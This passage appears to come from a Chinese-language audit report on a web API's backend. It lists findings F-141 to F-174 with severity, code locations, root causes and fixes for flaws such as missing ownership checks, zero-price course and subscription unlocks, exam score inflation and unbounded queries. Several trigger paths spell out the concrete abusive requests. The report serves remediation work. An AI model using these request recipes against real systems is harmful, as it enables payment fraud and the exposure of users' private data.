- **文件与行号**：`apps/api/src/services/knowledge-rag-service.ts:435-471`（`:456-471` 全量 for）；`services/knowledge-chat-context.ts:63-70`；`routes/knowledge-rag.ts:101-140`
- **触发路径**：未配置 embedding provider 或其故障时，每轮 `/api/chat/stream` 经 `loadKnowledgeContext` 调 `_searchByKeyword`；`POST /api/knowledge/search`、`/rag-context` 直达。
- **根因**：关键词兜底先 `SELECT` 该 owner+collection 的全部 chunk，再 Node 内逐条打分，最后才 `slice(topK)`；无 LIMIT、无 SQL 过滤、无候选上限。
- **证据**：`:435-455` `.where(and(eq(collectionName), eq(ownerUuid)))` 无 limit；`:456-468` 全量循环。
- **影响**：知识库越大内存/DB 压力越高，数十并发聊天可打爆进程（DoS）。
- **建议修法**：SQL 侧关键词过滤 + `LIMIT topK*N`；或 chunk 建 tsvector 索引；至少 `LIMIT 2000`。
- **是否当场可修**：是。

### F-141 「会话导入知识库」幂等是纯 check-then-write，并发双请求重复入库 + 重复收 embedding 费
- **严重度**：P2
- **文件与行号**：`apps/api/src/services/knowledge-rag-service.ts:262-295`；`packages/database/src/schema/knowledge-rag.ts:68-88`（`content_hash` 无唯一索引）；`routes/conversation-knowledge.ts:73-136`
- **触发路径**：双击「加入知识库」或前端重试 `POST /api/conversation-import/to-knowledge`（同一 conversationId）。
- **根因**：先查后写无锁，注释自认无唯一索引；无 `ON CONFLICT`。
- **证据**：`:264-278` 查询 `existing`；`:280` 直接 `_ingestChunks`。
- **影响**：两份 doc/两套 chunk，检索重复占 topK，embedding 费用翻倍。
- **建议修法**：`uniqueIndex(ownerUuid, contentHash, sourceType) WHERE status='active'`；写入按冲突返回 deduped。
- **是否当场可修**：是（需迁移）。

### F-142 团队知识修订的乐观锁是「先读后判」，UPDATE 不带 revision 条件；审计与正文非事务
- **严重度**：P2
- **文件与行号**：`apps/api/src/services/knowledge-team-service.ts:583-618`、`:629-660`、`:242-264`；`routes/knowledge-team.ts:238-268`
- **触发路径**：两名成员同时 `PUT /api/knowledge-team/items/:itemId` 或同时改状态。
- **根因**：`expectedRevision` 仅在内存比较，`UPDATE ... WHERE id=?` 无 revision；update 与 writeRevision 无事务。
- **证据**：`:583-585` 比较后 `:604` `update(...).where(eq(id)).returning()`；`:608` 独立 `writeRevision`。
- **影响**：后写覆盖先写、内容静默丢失，两条审计 revisionNo 相同无法追溯；审计失败则正文已改无审计。
- **建议修法**：`WHERE id=$1 AND revision=$2` + rowCount 判定；update+writeRevision 放事务；审计表加唯一约束。
- **是否当场可修**：是。

### F-143 直播回调「先写去重缓存、再落库」，DB 失败后 10 分钟内重试被判重复，直播状态永久错
- **严重度**：P2
- **文件与行号**：`apps/api/src/services/tencent-live-service.ts:91-113`（`:100` set，`:109/112` 更新）；`routes/live.ts:322-342`
- **触发路径**：腾讯云 `POST /api/live/tencent/callback`（stream_begin/stream_end）→ DB 更新抛错 → 500 → 平台重发同一 eventId。
- **根因**：幂等标记在副作用之前写入且不区分成败；重试命中缓存直接返回 duplicated。
- **证据**：`:100` `processedEventIds.set(eventId, now)`；`:109` `await updateLiveChannelStatusByStreamName(...)`。
- **影响**：频道状态与真实直播状态永久不一致；模块级 Map 多实例下又重复处理。
- **建议修法**：成功后再写缓存（或占位+失败删除）；去重落 Redis/DB 带 TTL。
- **是否当场可修**：是。

### F-144 embedding provider 三处裸 `fetch` 无超时/无 AbortSignal，RAG 检索与入库可被上游挂起拖死
- **严重度**：P2
- **文件与行号**：`apps/api/src/services/embedding-provider.ts:123-130`、`:157-164`、`:207-214`
- **触发路径**：每轮聊天 `knowledge-chat-context.ts:63-70` → `search` → `getEmbedding`；每次入库每条 chunk 亦然。
- **根因**：`fetch(url, {...})` 未传 signal，也未走统一 `aiServiceFetch`；`getEmbedding` 的 catch 对「迟迟不返回」无效。
- **证据**：`:123` `const resp = await fetch(DASHSCOPE_URL, { method:'POST', headers, body })`（无 signal）。
- **影响**：单个慢请求可挂数分钟，与 F-139 数万并发叠加耗尽 socket/内存，聊天首包超时。
- **建议修法**：统一 `AbortSignal.timeout(10-15s)` 或复用 `aiServiceFetch`。
- **是否当场可修**：是。

### F-145 删除文档「软删改状态」与「物理删 chunk」非事务，失败后已删内容仍被 RAG 召回
- **严重度**：P2
- **文件与行号**：`apps/api/src/services/knowledge-rag-service.ts:555-568`；检索侧 `:388-398`、`:442-455`、`knowledge-chat-context.ts:84-88`
- **触发路径**：`DELETE /api/knowledge/docs/:id` → UPDATE status 成功、`delete(chunk)` 失败。
- **根因**：两步无事务；检索只查 chunk 表，从不 join doc.status。
- **证据**：`:566` `await db.delete(knowledgeChunk).where(eq(docId))` 前一条已提交。
- **影响**：用户看到删除失败/列表消失，但聊天 RAG 仍注入并引用该文档（隐私/合规）。
- **建议修法**：两语句同事务；检索加 `EXISTS(... status='active')`。
- **是否当场可修**：是。

### F-146 `/files/:id/convert-markdown` 对 100MB 文件同步全量读；资产提取读完才判 20MB
- **严重度**：P3
- **文件与行号**：`apps/api/src/services/markdown-converter-service.ts:475-481`、`:494`、`:201`、`:269/:352`、`:597-607`；`routes/files.ts:717-746`（100MB 上传上限）、`:398-439`
- **触发路径**：上传 ≤100MB `.txt/.md/.xlsx/.pdf/.pptx` → `POST /api/files/:id/convert-markdown` 或 `/extract-assets`。
- **根因**：同步 fs/SheetJS/自研解压；`extractDocumentAssets` 先 `readFileSync` 再比 20MB；`readZipEntries` 一次性 inflate 全部条目（zip bomb）。
- **证据**：`:477` `readFileSync(filePath,'utf-8')`；`:599` 读完后 `:604` 才判大小。
- **影响**：单请求阻塞事件循环数秒并产生 ~200MB 字符串；高压缩比 pptx 可放大到 GB 级内存。
- **建议修法**：入口先 stat 判大小并设上限；改异步/流式；解压总大小上限；丢 worker_threads。
- **是否当场可修**：是。

### 第六轮 D：utils / db / schema

### F-147 VIP/开发者订阅发卡无幂等键，注释误以为「有唯一约束」
- **严重度**：P2
- **文件与行号**：`packages/database/src/schema/vip.ts:57-78`；`packages/database/drizzle/20261106150000_fix_missing_indexes_fks.sql:91,188`（仅普通索引）；`apps/api/src/db/vip-queries.ts:101-121`；`apps/api/src/routes/vip.ts:373-399,412-424`；`apps/api/src/routes/payment-gateway.ts:709/723/737/762`；`apps/api/src/plugins/payment-idempotency.ts:175`
- **触发路径**：前端轮询 `GET /vip/order/:orderNo/payinfo` 查单成功 → `purchaseVip`（不经支付幂等账本）；随后支付回调再 `activateOrderSubscription` → 再插一条 `user_vips`。或回调副作用失败 → `redis.del(key)` → 平台重试 → 再发卡。
- **根因**：`purchaseVip` 纯 INSERT，无 orderId 去重/ON CONFLICT/状态条件；`vip.ts:396-398` 的 `catch` 注释指望的唯一约束不存在。
- **证据**（已回读迁移）：`CREATE INDEX IF NOT EXISTS "ix_user_vips_order_id" ON "user_vips" ("order_id")` 非 UNIQUE；`vip-queries.ts:108-118` 直接 `insert(userVips).values({...orderId})`。
- **影响**：同订单多次发卡，每次按当前时间算 `endTime`，延迟重试等于白送 VIP；后台对账失真。开发者套餐同理。
- **建议修法**：`UNIQUE INDEX ... (order_id) WHERE order_id IS NOT NULL`；`onConflictDoNothing`；轮询路径复用幂等账本或改为只查状态。
- **是否当场可修**：否（需迁移）。

### F-148 VIP 按 `quantity` 收钱，但发卡只发一期
- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/vip.ts:316-355`（`:319` quantity、`:336/:349` 金额）；`apps/api/src/services/order-service.ts:567-573`；`apps/api/src/db/vip-queries.ts:101-121`；`packages/database/src/schema/billing.ts:86/94`
- **触发路径**：`POST /vip/order {"vipLevelId":..., "quantity":3}` → 支付成功 → 只发一期。
- **根因**：计费乘 `quantity`，履约无 quantity 入参；`createOrder` 未落 `orders.quantity`。
- **证据**：`vip.ts:333-340` `amount: level.price * quantity`；`order-service.ts:571-572` `purchaseVip({userId, vipLevelId, orderId})`。
- **影响**：买 3 份只得 1 份，直接超收；退款/对账口径错。
- **建议修法**：`createOrder` 写 quantity；`purchaseVip` 按 quantity 延长；或接口限制为 1。
- **是否当场可修**：是。

### F-149 企业学习报表汇总指标完全忽略时间范围与课程状态
- **严重度**：P3
- **文件与行号**：`apps/api/src/db/learn-extended-queries.ts:414-435`（`:417` 解构 startDate/endDate，`:435` 仅 `where(searchCond)`）；对照 `db/learn-queries.ts:489`
- **触发路径**：`GET /learn/reports/company-study?startDate=...&endDate=...`（`routes/learn.ts:2028-2034`）。
- **根因**：时间条件只用于 trend（`:449-462`），汇总只用 search；未过滤 `lessons.status=1`。
- **证据**：`:423-435` `.from(lessons).leftJoin(lessonSignUps,...).where(searchCond)`。
- **影响**：汇总卡片恒为全量，与趋势图对不上，误导运营决策。
- **建议修法**：汇总拼 startDate/endDate + `eq(lessons.status,1)` + searchCond。
- **是否当场可修**：是。

### F-150 报表趋势按 UTC 切日、且 `endDate` 被截到当天 00:00（丢最后一天）
- **严重度**：P3
- **文件与行号**：`apps/api/src/db/learn-extended-queries.ts:452,459-464`；对照已修 `db/learn-record-queries.ts:439-459`
- **触发路径**：同上，前端传 `YYYY-MM-DD`。
- **根因**：`to_char(created_at::date,...)` 用会话时区（默认 UTC）；`created_at <= endDate::timestamptz` 排除最后一天全天。
- **证据**：`:452` `to_char(${lessonSignUps.createdAt}::date,'YYYY-MM-DD')`；`:459-464` `>= startDate` / `<= endDate`。
- **影响**：东八区 00:00-08:00 数据归前一天；区间永远缺最后一天。
- **建议修法**：`AT TIME ZONE 'Asia/Shanghai'`；区间改 `< (endDate::date + 1)::timestamptz`。
- **是否当场可修**：是。

### F-151 插件安装/点击统计用 `current_date` 与裸 `to_char`，日界按 DB 时区
- **严重度**：P3
- **文件与行号**：`apps/api/src/db/plugin-events-queries.ts:82`、`:91-92`、`:118`、`:160-163`；`routes/admin-plugin-stats.ts`
- **触发路径**：管理员打开插件统计 → `getPluginStatsSummary`/`getPluginStatsTrend`。
- **根因**：`createdAt` 为 timestamptz，`current_date`/`to_char` 取会话时区（默认 UTC）。
- **证据**：`:91-92` `count(*) filter (... and created_at >= current_date)`；`:163` `to_char(created_at,'YYYY-MM-DD')`。
- **影响**：每日 0-8 点「今日」数据偏高，趋势与上海业务日看板不一致。
- **建议修法**：统一 `(created_at AT TIME ZONE 'Asia/Shanghai')::date`；`current_date` 同理。
- **是否当场可修**：是。

### F-152 评论软删除谓词缺失：已删评论仍可被回复/点赞，列表与计数含墓碑
- **严重度**：P3
- **文件与行号**：`apps/api/src/db/comment-queries.ts:39`、`:130`、`:214`；`apps/api/src/routes/comments.ts:252`（回复前）、`:404`（点赞）；对照 `:355`、`:391` 已判 `isDeleted`
- **触发路径**：作者删除评论后，`GET /comments?topicId=...` 仍见墓碑并计入 total；`POST /comments` 带 `parentId=<已删评论>` 成功；`POST /comments/:id/like` 成功。
- **根因**：读路径未带 `eq(comments.isDeleted,false)`；父级校验与点赞未判 `isDeleted`。
- **证据**：`comment-queries.ts:130` `select().from(comments).where(eq(comments.id,id)).limit(1)`。
- **影响**：删除后内容仍占据列表与分页总数，可继续长 UGC，计数虚高；与 PATCH/DELETE 的 404 语义不一致。
- **建议修法**：三个读函数加 `isDeleted=false`；路由层统一 404。
- **是否当场可修**：是。

### 第六轮 E：other / user 剩余

### F-153 付费课程可零支付解锁（报名接口无支付校验，签名播放 URL 照发）
- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/user/study-routes.ts:84-104`；`apps/api/src/routes/user/course-routes.ts:80-87`；`apps/api/src/db/learn-queries.ts:639-645`；`apps/api/src/routes/learn/get-lesson-video.ts:57-60,100-101`；对照购买链路 `routes/miniapp-compat-routes.ts:2860-2920`
- **触发路径**：登录用户 `POST /api/course/{付费课id}/enroll`（或 `POST /api/study/records`）→ `GET /api/learn/lesson/{id}/video` 拿到签名播放地址。
- **根因**：付费墙判据是「已报名」，报名是免费写 `lesson_sign_ups`；购买链路扣余额但不写 signup，无「支付成功 ⇄ 报名」绑定。
- **证据**：`learn-queries.ts:639-645` `signUpLesson` 仅 `insert(lessonSignUps).onConflictDoNothing()`；`get-lesson-video.ts:57-60` `if (!lesson.isFree) { if (!(await isSignedUp(...))) return 403 }`。
- **影响**：所有付费课程可免费观看；真实付费用户若未额外报名反而看不了。
- **建议修法**：统一 `isFree || price<=0` 判据；付费课要求 `status='paid'` 课程订单，并在同事务内扣费+写 signup。
- **是否当场可修**：是。

### F-154 私信 / 通知详情越权读取（无属主校验）
- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/user/misc-routes.ts:150-162`；`db/notification-queries.ts`（`findNotificationById` 只按 id）；`db/chat-queries.ts`（`findMessageById` 只按 id）
- **触发路径**：登录用户 `GET /api/messages/{uuid}`、`GET /api/notifications/{uuid}` 返回他人私信/通知。
- **根因**：查询无 userId 谓词，handler 不比对；同文件 `updateMessage` 有 `receiverId !== request.userId → 403`，读写鉴权不一致。
- **证据**（已回读）：`misc-routes.ts:157-162` `const message = await findMessageById(id); return reply.send(success({ message }))`。
- **影响**：聊天内容、通知正文及 `data`（订单/退款载荷）可被任意登录用户读取。
- **建议修法**：查询加 `or(eq(receiverId,userId), eq(senderId,userId))`（通知按 userId），未命中 404。
- **是否当场可修**：是。

### F-155 圈子话题（circle_dynamic）任意用户可改/删，且可冒用他人 memberId 发帖
- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/community/topics.ts:96-135`（创建，memberId 取 body）、`:137-182`（PUT）、`:184-197`（DELETE）
- **触发路径**：`PUT /api/circles/topic/{id}` 改任意话题；`DELETE /api/circles/topic/{id}` 删任意话题；`POST /api/circles/topic {"memberId":他人id}` 以他人身份发帖。
- **根因**：写操作仅 `eq(circleDynamic.id, tidNum)`，无归属校验；创建直接落库客户端 `memberId`。
- **证据**：`:175` `update(circleDynamic).set(updateData).where(eq(circleDynamic.id, tidNum)).returning()`；`:191` `delete(circleDynamic).where(eq(id, tidNum))`。
- **影响**：篡改/删除他人话题（含 status），冒充他人发言，UGC 审计失真。
- **建议修法**：PUT/DELETE 加属主谓词（admin 例外）；memberId 服务端解析。
- **是否当场可修**：是。

### F-156 名片详情不校验 isPublic，他人私密名片手机号/邮箱/二维码可读
- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/other/business-card-routes.ts:247-261`；对照 `:91,114,133` 列表/搜索强制 `isPublic=true`；字段 `:43-53`
- **触发路径**：登录用户 `GET /api/business-card/{uuid}` 得到含 `phone/email/qrCode` 的完整记录（即使 `isPublic=false`）。
- **根因**：详情查询只按 id，未叠加 `isPublic or 本人`；`viewCount` 读改写非原子。
- **证据**：`:250-260` `select().from(businessCards).where(eq(businessCards.id,id)).limit(1)`；`set({ viewCount: card.viewCount + 1 })`。
- **影响**：私密名片 PII 泄露；浏览量丢更新。
- **建议修法**：`where(and(eq(id), or(eq(isPublic,true), eq(userId, request.userId))))`；`view_count + 1` 原子自增。
- **是否当场可修**：是。

### F-157 平台 Key 大模型调用无计量/无配额（绕过 token 扣费）
- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/user/ai-capabilities-routes.ts:83-100`；`apps/api/src/routes/user/ai-modules-routes.ts:291-338`
- **触发路径**：登录用户循环 `POST /v1/ai/capabilities/invoke`（input 上限 10k）与 `POST /ai/career-advice`（max_tokens 2500）。
- **根因**：直接 `callRealLlm`/`fetch(AI_SERVICE_URL/api/llm/complete)`，无扣费、无每用户日配额；仅全局 100 次/分钟/IP。
- **证据**：`ai-capabilities-routes.ts:95` `const llmResult = await callRealLlm({ messages: [...] })`。
- **影响**：可稳定刷出高额模型账单，无用户级公平限制。
- **建议修法**：接入聊天一致的计量/扣费或日配额（余额不足 402）。
- **是否当场可修**：可，但需产品定义计量规则。

### F-158 圈子分类关系（全局配置表）任意登录用户可增删
- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/community/topics.ts:271-294`（POST）、`:297-309`（DELETE）
- **触发路径**：`POST /api/circles/category-relation`、`DELETE /api/circles/category-relation/{id}`。
- **根因**：全局类目树配置写接口只挂 `authenticate`，无 admin 校验。
- **证据**：`:271` `server.post('/circles/category-relation', async ...)` 直接 `insert(circleCategoryRelation)`。
- **影响**：任意用户污染/破坏全站分类层级，可无限插入。
- **建议修法**：两个写接口加 `requireAdmin`。
- **是否当场可修**：是。

### F-159 剧本（/drama）任意用户可改/删/批量删，含他人草稿
- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/other/drama-routes.ts:283-320`（PUT）、`:322-334`（DELETE）、`:218-269`（batch）
- **触发路径**：`PUT/DELETE /api/drama/{id}`、`POST /api/drama/batch-delete` 操作任意记录。
- **根因**：`dramaStore` 为模块级全局 Map，写操作只校验存在性与状态机，无 owner 判断。
- **证据**：`:314` `dramaStore.set(id, updated)`；`:328` `dramaStore.delete(id)`。
- **影响**：篡改/删除他人剧本。
- **建议修法**：DTO 增加 ownerId，写操作加属主/admin 校验。
- **是否当场可修**：是。

### F-160 工单评级无属主校验（对照同文件其他端点已校验）
- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/other/v1-customer-service-routes.ts:123-128`
- **触发路径**：`GET /api/v1/customer_service/ticket/{id}/rate` 读取任意工单评分/评价。
- **根因**：相邻 `:111-117`（replies）、`:131-137`（close）均判 `ticket.userId !== request.userId → 403`，rate 漏了。
- **证据**：`:123-128` 直接 `findRatingByTicket(id)` 返回。
- **影响**：工单评价可被任意登录用户按 id 读取。
- **建议修法**：先查 ticket 并比对 userId（与相邻端点一致）。
- **是否当场可修**：是。

## 十一、第七轮新增（admin relay/job、miniapp/edu、db 剩余、relay 池/短信、mcp/BYOK）

> 本轮 5 路并行，共 29 条。已复核关键 P0：`miniapp-compat-routes.ts:345-378` 课程 PUT 仅 `checkAuth`；`hooks.py:316-318` PATCH 无 `_is_admin`。

### 第七轮 A：admin relay / job / tool

### F-161 个人号池的「属主」边界完全未校验：任一管理员可共享/停用/删除其他管理员的账号
- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/admin/relay-account-pool.ts:639-659,661-681,824-874,876-923,974-1017,684-703`；`apps/api/src/services/relay-account-pool-service.ts:1509-1546`
- **触发路径**：管理员 A `GET /admin/relay/accounts?owner=all` 拿到 B 的个人号 id → `POST /admin/relay/accounts/:id/share` → 全站用户消耗 B 的上游额度；或直接 `DELETE /admin/relay/accounts/:id` 物理删号。
- **根因**：插件级 `requireAdmin` 只判「是不是管理员」，所有写操作仅按主键定位，无 `ownerUserId = request.userId`；同文件 claim/release 已按 `request.jwtPayload.userId` 校验，说明身份可得。
- **证据**：`:644` `setAccountShared(p.data.id, true)`（无 userId）；`:979-981` `delete(aiRelayAccountPool).where(eq(id, p.data.id))`；注释 `:599-601` 明确「之后可由本人共享」但代码未落实。
- **影响**：跨管理员付费账号被共享给全网、被停用或不可逆删除。
- **建议修法**：按 id 的写操作统一加 `and(eq(id), or(eq(ownerUserId, actor), isNull(ownerUserId)))`；`setAccountShared` 增 `actorUserId`；删除/共享独立权限点。
- **是否当场可修**：是（需产品确认超管口径）。

### F-162 数据清理声称「单批上限 50000 行」，实际 DELETE 无 LIMIT，可一次删光整表历史
- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/admin/relay-data-management.ts:85-107`（注释 `:20-21,:85`，DELETE `:102-104`）
- **触发路径**：`POST /admin/relay/data-management/cleanup {"table":"llm_call_logs","keepDays":30,"dryRun":false}`。
- **根因**：SQL 为全表条件 `DELETE ... WHERE created_at < ...`，无 LIMIT/分批；`dryRun: z.coerce.boolean().default(false)` 会把字符串 `"false"` 解析为 `true`；`:106` 日志模板未插值，审计恒为空。
- **证据**：`WITH del AS (DELETE FROM ${sql.identifier(meta.table)} WHERE created_at < now() - (${keepDays} || ' days')::interval RETURNING 1) SELECT count(*)::int FROM del`。
- **影响**：大表长事务、锁表与 WAL 膨胀；清理不可回滚；dryRun 误判导致「已清理/未清理」错判。
- **建议修法**：`DELETE ... WHERE ctid IN (SELECT ctid ... LIMIT 50000)` 循环；`dryRun` 用既有布尔 schema；修正日志插值。
- **是否当场可修**：是。

### F-163 「定时任务」全链路无执行器，`PUT /job/run` 无动作却返回「任务已触发执行」
- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/admin-sys/job-routes.ts:110-121`（`invokeTarget`/`cronExpression` 仅 `min(1)` 于 `:19-29`）；`apps/api/src/db/admin-sys-queries.ts:372-430`；全仓 `sysJobs` 无调度器消费者
- **触发路径**：`POST /job` 建任意 `invokeTarget`/`cronExpression` → 到点不执行 → `PUT /job/run` 返回 200 `{message:'任务已触发执行'}`。
- **根因**：仅 CRUD 与存在性检查，`run` 分支 `findJobById` 后直接 `reply.send`；`invokeTarget` 无白名单。
- **证据**：`:116-120` 仅查存在性后返回消息。
- **影响**：依赖该功能的日志清理/备份永不发生；一旦补执行器，未校验的 `invokeTarget` 立即成为任意调用面。
- **建议修法**：未实现时返回 501；cron 用解析器校验；`invokeTarget` 改任务注册表 id 白名单。
- **是否当场可修**：是。

### F-164 返佣两级费率各自 ≤1，合计可达 200%，释放时直接给上级 Key 余额加钱
- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/admin/relay-commission.ts:39-51`；`apps/api/src/services/relay-commission-service.ts:220-237,315-341`
- **触发路径**：`PUT /admin/relay-commission/settings {"level1Rate":1,"level2Rate":1}` → 每笔调用产生两条各 100% 返佣，冻结期后加到父级/祖父级 Key 余额。
- **根因**：只校验单级 0..1，缺 `level1+level2 <= 1` 跨字段约束；释放侧无二次封顶。
- **证据**：`:42-44` 两个 `.max(1)`；`service:221-222` `commissionCents = roundCents(sourceCostCents * rate)`。
- **影响**：返佣支出可超过消费成本，形成套现口子。
- **建议修法**：schema `.refine(d => (d.level1Rate??0)+(d.level2Rate??0) <= 1)`；释放侧截断并告警。
- **是否当场可修**：是。

### F-165 `/admin/relay/capacity/call-trend` 查询不存在的列，接口恒定 500
- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/admin/relay-capacity.ts:120`；`packages/database/src/schema/llm-call-logs.ts:83`（只有 `cost_cents`）；`developer-api-keys.ts:54`
- **触发路径**：`GET /admin/relay/capacity/call-trend?days=30` → 42703 `column "cost_used_total_cents" does not exist` → 500。
- **根因**：误用 `developer_api_keys` 的累计列名查 `llm_call_logs`。
- **证据**：`:117-123` `COALESCE(sum(cost_used_total_cents),0) ... .from(sql\`llm_call_logs\`)`。
- **影响**：容量面板成本/失败趋势永久不可用。
- **建议修法**：改 `sum(cost_cents)` 并补最小查询测试。
- **是否当场可修**：是。

### 第七轮 B：miniapp / edu / legacy

### F-166 课程/视频管理写接口只挂 checkAuth，任意登录用户可改价、上下架、删课
- **严重度**：P0
- **文件与行号**：`apps/api/src/routes/miniapp-compat-routes.ts:327-342,345-378,381-391,394-404,407-417,420-438,441-466,469-476`；`plugins/auth.ts:311-321`
- **触发路径**：普通登录用户 `PUT /api/learn/course/{uuid} {"price":0,"isFree":true}`；`DELETE /api/learn/course/{uuid}`；`POST /api/learn/course/{uuid}/issue|delist`；`POST/PUT/DELETE /api/learn/video...`。
- **根因**：8 个写端点仅 `{preHandler: checkAuth}`，`checkAuth` 只做认证；无 `requireAdmin`、无讲师归属判断，handler 不读 `request.userId`。
- **证据**（已复核）：`:345` `server.put('/learn/course/:id', { preHandler: checkAuth }, ...)` 直接写入 `price/isFree`；`:381` `delete`；`:474` 物理删 `lessonChapterSections`。
- **影响**：任意用户可把付费课改 0 元、下架、软删课程、物理删除视频小节，课程目录与收入面完全接管。
- **建议修法**：加 `requireAdmin` 或讲师归属校验；删除改软删。
- **是否当场可修**：是。

### F-167 `/agents/charge` 价格与支付状态由客户端决定，可 0 元自助「已支付」
- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/miniapp-compat-routes.ts:2200,2209-2247,2287-2323,2257`
- **触发路径**：`POST /api/agents/charge {"price":0,"duration":365}` → `PUT /api/agents/charge {"id":..., "status":"active"}` → `GET /api/agents/charge/{agentId}` 返回 `chargeType:'paid'`。
- **根因**：`price`/`status` 均为客户端输入并原样落库/回写；无支付回调权威来源，`pay-history` 扣减与该记录无绑定，`quantity` 亦客户端可控。
- **证据**：`:2218` `price: z.number().min(0)`；`:2287-2295` `if (body.status) updates.status = body.status; if (body.price !== undefined) updates.price = ...`；`:2200` `chargeType: record.status === 'active' ? 'paid' : record.status`。
- **影响**：付费智能体/会员可 0 元解锁，金额可任意改。
- **建议修法**：价格服务端按 agentId 生成；status/price 禁止客户端写；支付回调更新。
- **是否当场可修**：是。

### F-168 考试答题记录 start / submit-exam / status 缺属主校验（BOLA）
- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/exam.ts:1192-1209,1211-1229,1231-1243`；对照 `:699-709`；`db/exam-extended-queries.ts:584`
- **触发路径**：登录用户拿他人 `recordId` → `POST /api/exam/records/{recordId}/start`、`/submit-exam`、`GET /status`。
- **根因**：三端点仅 `checkAuth`，查询函数只按 id，不接收/比对 userId；同文件 `/exam/records/:id` 有正确写法。
- **证据**：`:1193-1199` `checkAuth` 后 `startAnswering(parsed.data.recordId)`；`exam-extended-queries.ts:584` 无 userId 参数。
- **影响**：可替他人开始/提前交卷，读取他人答题明细，改写考试时长/提交时间。
- **建议修法**：先查记录并比对 `record.userId === request.userId`。
- **是否当场可修**：是。

### F-169 `/api/edu/certificates/:id` 证书详情无属主校验
- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/edu-frontend-routes.ts:165-173`；对照下载 `:177-186`
- **触发路径**：任意登录用户 `GET /api/edu/certificates/{任意证书uuid}`。
- **根因**：`findCertificateById` 只按 id，handler 未比对 `cert.userId`；同文件下载端点有比对。
- **证据**：`:170-173` 直接 `reply.send(success({ certificate: cert }))`；`:184` 下载处 `if (cert.userId !== request.userId) 403`。
- **影响**：泄露他人姓名、证书编号、发证时间、userId、来源课程。
- **建议修法**：detail 补属主校验（403/404）。
- **是否当场可修**：是。

### F-170 `/api/self-media/records` 返回全站用户自媒体记录与 payload
- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/self-media-routes.ts:218-234`（写入 `:212`）
- **触发路径**：任意登录用户 `GET /api/self-media/records?category=wechat&limit=100`。
- **根因**：查询仅可选 `category`，无 `authorId = request.userId`；写入时有 `authorId`，读侧未用。`limit` 可为负触发 500。
- **证据**：`:224-231` 仅 `if (cat) conds.push(eq(category,cat))` 后 `select().from(selfMediaPublished).limit(lim)`。
- **影响**：跨用户创作内容（title/topicKeyword/payload/authorId/status/draftId）泄露。
- **建议修法**：加 `eq(authorId, request.userId)`；`lim` 夹到 `[1, HISTORY_LIMIT]`。
- **是否当场可修**：是。

### F-171 `/api/edu/courses/:id/qa` 先按全站分页再内存过滤，分页与 total 均失真
- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/edu-frontend-routes.ts:280-294`；`db/learn-extended-queries.ts:644-683`
- **触发路径**：某课程 Q&A 少但全站 Q&A 多时，`GET /api/edu/courses/{id}/qa?page=1&pageSize=20`。
- **根因**：`findAllCommunityPosts` 无 `lessonId` 条件；路由先取全站一页再内存 `filter`，`total` 写成过滤后当前页条数。
- **证据**：`:284-292` `findAllCommunityPosts({page,pageSize,status:'published'})` → `.filter(p => p.lessonId === id)` → `total: filtered.length`。
- **影响**：目标课程问答被挤出而显示为空，无法翻页。
- **建议修法**：查询层增加 `lessonId` 落到 SQL WHERE，total 用带条件的 count。
- **是否当场可修**：是。

### 第七轮 C：db 剩余

### F-172 考试判分按客户端 `answers` 逐项累加，重复 `questionId` 可无限刷分
- **严重度**：P1
- **文件与行号**：`apps/api/src/db/exam-queries.ts:500-556`（核心 `:513-535`）；调用方 `routes/exam.ts:295-311,607-627`；`routes/edu-frontend-routes.ts:89-98,584-601`
- **触发路径**：`POST /exam/records/:id/submit` 或 `POST /edu/exam/:id/submit`，body 中把同一道已答对题的 `questionId` 重复提交 N 次。
- **根因**：判分对 `answers.map(...)` 逐项匹配并累加 `totalScore`，不去重、不校验题目集合；schema 仅 `.min(1)` 无 `.max()`。
- **证据**：`exam-queries.ts:513-535` `answers.map(a => { ... totalScore += score })`；`exam.ts:295-311` `z.array(...).min(1)`。
- **影响**：`score/isPassed/排名` 可刷到任意高分，证书与排行榜可信度失效。
- **建议修法**：入库前按 questionId 去重并校验 ⊆ 试卷题目；schema 加 `.max(题量)`。
- **是否当场可修**：是。

### F-173 公开帮助文章列表未过滤 `isPublished`，草稿全文匿名可读
- **严重度**：P2
- **文件与行号**：`apps/api/src/db/content-queries.ts:202-209`；`routes/content.ts:344-370`（公开）、`:382`（详情有过滤）、`:610/677`（管理端复用）
- **触发路径**：匿名 `GET /api/content/help/articles?category=...`。
- **根因**：`findHelpArticles` 仅按 category，返回全部行（含正文与 `is_published=false`）；同一函数被公开与管理端复用。
- **证据**：`content-queries.ts:202-209` `select().from(helpArticles).where(where)` 无 `isPublished`。
- **影响**：未发布草稿全文公开（详情接口却 404）。
- **建议修法**：增加 `publishedOnly?: boolean`，公开端点传 true。
- **是否当场可修**：是。

### F-174 `recordWatch` 读改写累计时长：客户端可控且可致 int4 溢出永久 500
- **严重度**：P2
- **文件与行号**：`apps/api/src/db/behavior-queries.ts:26-70`；`routes/behavior.ts:28-34,161-168`；`packages/database/src/schema/behavior.ts:22`
- **触发路径**：`POST /api/behavior/watch {"watchDuration":2147483647}`，同 topic 再调一次；或并发心跳。
- **根因**：`watchDuration` 仅 `.min(0)` 无上限，列为 `integer`；先 SELECT 再 `row.watchDuration + delta` UPDATE，无 `FOR UPDATE`/原子自增/溢出保护。
- **证据**：`behavior.ts:32` `z.number().int().min(0)`；`behavior-queries.ts:44-53` `set({ watchDuration: (row.watchDuration ?? 0) + watchDuration })`。
- **影响**：溢出后 22003 永久 500；并发丢更新；客户端可伪造时长污染指标。
- **建议修法**：`sql` 原子自增 + `LEAST(..., 上限)`；schema `.max()`；首次插入用 `onConflictDoUpdate`。
- **是否当场可修**：是。

